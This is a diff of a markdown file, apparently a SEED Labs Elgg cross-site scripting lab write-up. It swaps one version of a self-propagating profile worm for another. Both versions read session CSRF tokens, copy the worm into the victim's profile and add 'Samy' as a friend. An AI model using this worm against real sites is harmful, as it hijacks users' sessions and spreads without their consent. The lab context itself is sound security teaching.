@@ -81,41 +81,44 @@ That's what, again, should happen. Unfortunately for me that does not seem to be
 
 ```js
 
-<script type="text/javascript" id="worm">
-window.onload = function(){
+<script id=worm>
+    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";  // (1)
+    var jsCode = document.getElementById("worm").innerHTML;           // (2)
+    var tailTag = "</" + "script>";                                   // (3)
 
-var headerTag = "<script id=\ "worm\" type=\"text/javascript\">";
-var jsCode = document.getElementById("worm").innerHTML;
-var tailTag="</" + "script>";
-var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);  // (4)   
+ var username=elgg.session.user.name;
+    var guid="&guid="+elgg.session.user.guid;
+    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+    var token="&__elgg_token="+elgg.security.token.__elgg_token;
 
-var userName=elgg.session.user.name;
-var guid="&guid="+elgg.session.user.guid;
-var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
-var token="&__elgg_token="+elgg.security.token.__elgg_token;
+    // TODO: Set the content of the description field and access level.
+    var desc="&description=Zoe was here again" + wormCode;
+    desc+= "&accesslevel[description]=2";
+    var samyGuid=59;
+    var name="&name="+username
+    // TODO: Set the URL, and create and send Ajax request to modify profile
+    var sendurl="http://www.xsslabelgg.com/action/profile/edit";
+    var content=token+ts+name+desc+guid
+    if (elgg.session.user.guid!=samyGuid)       // (1)
+    {
+        // Create and send Ajax request to modify profile
+        var Ajax=null;
+        Ajax=new XMLHttpRequest();
+        Ajax.open("POST",sendurl,true);
+        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send(content);
+    }
 
-var accesslevel="&accesslevel[description]=2";
-var description="&description="+wormCode;
-var briefdescription="&briefdescription=Zoe was here again";
+    // TODO: Set the URL, and create and send Ajax request to add Samy as a friend
+    sendurl="http://www.xsslabelgg.com/action/friends/add?friend=59"+ts+token;
 
-var content=token +ts +userName + description + briefdescription+accesslevel+guid;
-var sendurl="http://www.xsslabelgg.com/action/profile/edit";
-var Ajax=null;
-Ajax=new XMLHttpRequest();
-Ajax.open("POST",sendurl,true);
-Ajax.setRequestHeader("Host","www.xsslabelgg.com");
-Ajax.setRequestHeader("Content-Type",
-	"application/x-www-form-urlencoded");
-Ajax.send(content);
+    Ajax=new XMLHttpRequest();
+    Ajax.open("GET",sendurl,true);
+    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+    Ajax.send();
 
-var Ajax2=null;
-var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=59"+ts+token;
-Ajax=new XMLHttpRequest();
-Ajax2.open("GET",sendurl,true);
-Ajax2.setRequestHeader("Host","www.xsslabelgg.com");
-Ajax2.setRequestHeader("Content-Type",
-	"application/x-www-form-urlencoded");
-Ajax2.send();
-}
 </script>
 ```
